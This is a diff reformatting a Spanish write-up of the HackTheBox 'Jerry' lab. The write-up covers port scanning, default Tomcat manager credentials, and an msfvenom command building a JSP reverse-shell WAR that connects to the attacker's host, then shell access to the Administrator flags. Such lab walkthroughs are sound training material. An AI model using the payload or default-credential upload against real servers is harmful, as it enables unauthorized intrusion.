@@ -1,26 +1,16 @@
 # Jerry
 
-Plataforma: HackTheBox
-OS: Windows
-Level: Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 2 de diciembre de 2024 13:42
-IP: 10.10.10.95
+Plataforma: HackTheBox OS: Windows Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 2 de diciembre de 2024 13:42 IP: 10.10.10.95
 
 ## Recopilación de información
 
-<aside>
 💡
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 ❯ ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allports
@@ -34,7 +24,7 @@ PORT     STATE SERVICE    REASON
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p8080 -sCV --script=http-enum 10.10.10.95 -oN targeted
@@ -49,14 +39,11 @@ PORT     STATE SERVICE VERSION
 
 ```
 
-- **Identificación de vulnerabilidades**
-    - 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+* **Identificación de vulnerabilidades**
+  * 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1
+*   **Enumeracion Web (8080)**
 
-- **Enumeracion Web (8080)**
-    
-    
-    ![image.png](/images/HackTheBox/image.png)
-    
+    ![image.png](<../../.gitbook/assets/image (1).png>)
 
 Whateweb
 
@@ -68,26 +55,23 @@ http://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServe
 
 Revisando la web vemos el apartado “Server status” y al acceder aparece:
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
 Con dos credenciales : tomcat/s3cret
 
 Probamos a acceder:
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
 Vemos que al acceder, podemos subir ficheros .war
 
 ## Explotación
 
-<aside>
 💡
-
-</aside>
 
 ### Explotación 1
 
-Creamos un payload con msfvenom: 
+Creamos un payload con msfvenom:
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.9 lport=4444 -f war > shell.war
@@ -97,7 +81,7 @@ Subimos el fichero, nos ponemos a la escucha con netcat y accedemos a la web /sh
 
 Obtenemos la rever:
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 Accedemos a los directorios de Administrador :
 
@@ -127,14 +111,8 @@ C:\Users\Administrator\Desktop\flags>
 
 ## Explotación posterior
 
-<aside>
 💡 No hay escalada de privilegios
-
-</aside>
 
 ## Conclusión
 
-<aside>
 💡
-
-</aside>
